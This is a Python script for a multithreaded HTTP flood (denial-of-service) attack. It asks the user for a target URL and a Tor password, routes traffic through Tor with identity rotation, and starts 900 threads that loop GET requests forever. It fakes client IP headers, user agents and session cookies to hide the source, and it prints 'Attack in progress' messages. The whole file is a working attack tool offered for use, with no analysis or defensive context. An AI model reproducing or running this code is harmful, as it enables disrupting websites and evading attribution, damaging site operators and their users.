import requests
import random
import sys
import os
import time
import threading
from fake_useragent import UserAgent
from stem.control import Controller
from stem import Signal
from colorama import Fore, init

ua = UserAgent()
user_agent = ua.random

init()

def change_tor_identity(tor_password):
    with Controller.from_port(port=9051) as controller:
        controller.authenticate(password=tor_password)
        controller.signal(Signal.NEWNYM)
        print(log.success + f" TOR IP change completed")

class log:
    wait = f"{Fore.LIGHTWHITE_EX}[{Fore.LIGHTCYAN_EX} * {Fore.LIGHTWHITE_EX}]"
    success = f"{Fore.LIGHTWHITE_EX}[{Fore.LIGHTGREEN_EX} ✓ {Fore.LIGHTWHITE_EX}]"
    warning = f"{Fore.LIGHTWHITE_EX}[{Fore.LIGHTYELLOW_EX} ! {Fore.LIGHTWHITE_EX}]"
    error = f"{Fore.LIGHTWHITE_EX}[{Fore.LIGHTRED_EX} X {Fore.LIGHTWHITE_EX}]"

def title():
    os.system('clear || cls')
    sys.stdout.write(f'''
{Fore.LIGHTGREEN_EX}                    ─
                  ╓░'
                 ║`
{Fore.LIGHTMAGENTA_EX} ╗mmm╗╗╗╗╗m     {Fore.LIGHTWHITE_EX}▐▓{Fore.LIGHTMAGENTA_EX}        ╓╓╥╗╗m╥,   ╗╗╗   m╗╗ ┌╥╗╗╗╗╗╗H∩╓╗mm╗╗m╗╗╗
{Fore.LIGHTMAGENTA_EX} ▒╢╢▒▒▒╣╝╝╛   {Fore.LIGHTWHITE_EX} ▄█▓{Fore.LIGHTMAGENTA_EX}▒╖     ]▒▒╢Ñ╝╣▒▒L ]▒▒▒▒  ▒▒╢ ║▒▒▒╢▒╢ÑÑ─║╢╢▒▒▒▒╝╝╝
{Fore.LIGHTMAGENTA_EX}    ║▒▒[   {Fore.LIGHTWHITE_EX} ▄████▓█{Fore.LIGHTMAGENTA_EX}Ü▒║╖  ║╢▒~  ╢▒▒L ║▒╢╢▒╢]▒▒[ ╢▒▒Ç ,,.     ╞▒▒▒
{Fore.LIGHTMAGENTA_EX}    ▒▒▒L  {Fore.LIGHTWHITE_EX} ██████▌█▓{Fore.LIGHTMAGENTA_EX}╙▒▒▒ ║▒▒@╣╢║╣╜  ║▒▒╝╣▒▒▒▒[ ▒▒╣╢╢▒▒╣     ║▒▒╢
{Fore.LIGHTMAGENTA_EX}    ╣▒▒U  {Fore.LIGHTWHITE_EX} ██████▓▌{Fore.LIGHTMAGENTA_EX}▌]░░░ ▒▒▒╝╢▒▒@   ▒▒╣ ╙▒╢▒▒[ ▒▒╢─         ╜▒▒@
{Fore.LIGHTMAGENTA_EX}    ]▒▒   {Fore.LIGHTWHITE_EX} ▀█▌███▓▌{Fore.LIGHTMAGENTA_EX}░¿░░░ ▒▒▒  ╚▒▒╣  ▒▒▒  ║▒▒▒[ ▒▒▒▒╣▒▒▒▒    ░▒▒L
{Fore.LIGHTMAGENTA_EX}    ╝╝╝    {Fore.LIGHTWHITE_EX}  ▀N▀╣{Fore.LIGHTMAGENTA_EX}▀╛ ░"   ╜╜╜   ╙╙   ╝╝╝   ╨╝╨" ╝╝╜╜╙╙╙╙╙    ╚╝╝─   
    \n''')

title()

headers = {
    "Content-Type": "application/json",
    "User-Agent": user_agent,
    "Referer": random.choice(["https://google.com", "https://yahoo.com", "https://bing.com"]),
    "X-Forwarded-For": f"{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}",
    "DNT": "1",
    "Accept-Language": random.choice(["en-US,en;q=0.9", "fr-FR,fr;q=0.9", "es-ES,es;q=0.9", "de-DE,de;q=0.9"]),
    "Cache-Control": "no-cache",
    "Pragma": "no-cache",
    "Connection": "keep-alive",
    "TE": "Trailers",
    "Upgrade-Insecure-Requests": "1",
    "Forwarded": f"for={random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)};proto=https",
    "X-Requested-With": "XMLHttpRequest",
    "Origin": random.choice(["https://google.com", "https://yahoo.com", "https://bing.com"]),
    "Accept": random.choice(["text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8", "application/json,text/html"]),
    "If-None-Match": f"{random.randint(10000, 99999)}",
    "Accept-Encoding": "gzip, deflate, br",
    "X-Real-IP": f"{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}",
    "X-Forwarded-Proto": "https",
    "X-Frame-Options": "DENY",
    "Referrer-Policy": "no-referrer",
    "Content-Security-Policy": "default-src 'self'",
    "X-Content-Type-Options": "nosniff",
    "Strict-Transport-Security": "max-age=31536000; includeSubDomains",
    "Feature-Policy": "geolocation 'none'",
    "Permissions-Policy": "camera=(), microphone=()",
    "Accept-CH": "DPR, Viewport-Width, Width",
    "X-Permitted-Cross-Domain-Policies": "none",
    "Access-Control-Allow-Origin": "*",
    "Access-Control-Allow-Methods": "GET, POST, OPTIONS",
    "Access-Control-Allow-Headers": "Content-Type, Authorization",
    "X-XSS-Protection": "1; mode=block",
    "Cache-Control": "no-store, no-cache, must-revalidate",
    "Expires": "0",
    "Content-Disposition": "inline",
    "X-Download-Options": "noopen",
    "X-Robots-Tag": "noindex, nofollow",
}

cookies = {
    "sessionid": ''.join(random.choices('abcdefghijklmnopqrstuvwxyz0123456789', k=32)),
    "csrftoken": ''.join(random.choices('abcdefghijklmnopqrstuvwxyz0123456789', k=40)),
    "userid": ''.join(random.choices('ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789', k=10)),
    "tracking_id": ''.join(random.choices('abcdefghijklmnopqrstuvwxyz0123456789', k=16)),
    "custom_cookie": ''.join(random.choices('abcdefghijklmnopqrstuvwxyz0123456789', k=24)),
}

url = input(f'{Fore.LIGHTWHITE_EX}URL{Fore.LIGHTMAGENTA_EX} :{Fore.LIGHTWHITE_EX} ')
tor_password = input(f'{Fore.LIGHTWHITE_EX}TOR PASSWORD{Fore.LIGHTMAGENTA_EX} :{Fore.LIGHTWHITE_EX} ')

def send_requests():
    try:
        while True:
            tor_proxy = {
                    'http': 'socks5h://127.0.0.1:9050',
                    'https': 'socks5h://127.0.0.1:9050'
            }
            response = requests.get(url, proxies=tor_proxy, headers=headers, cookies=cookies)
            print(log.success + f" Attack in progress. . .  {Fore.LIGHTBLACK_EX} │{Fore.LIGHTWHITE_EX}   STATUS{Fore.LIGHTYELLOW_EX} →{Fore.LIGHTGREEN_EX}  {response.status_code}")
    except Exception as e:
        print(log.error + f"{Fore.LIGHTRED_EX} Connection failed  {Fore.LIGHTBLACK_EX} │{Fore.LIGHTBLACK_EX}   {e}")

    except requests.exceptions.RequestException as e:
        print(log.error + f" An error has occurred")

threads = []
change_tor_identity(tor_password)
for i in range(900):
    thread = threading.Thread(target=send_requests)
    time.sleep(0.1)
    thread.start()
    threads.append(thread)

for thread in threads:
    thread.join()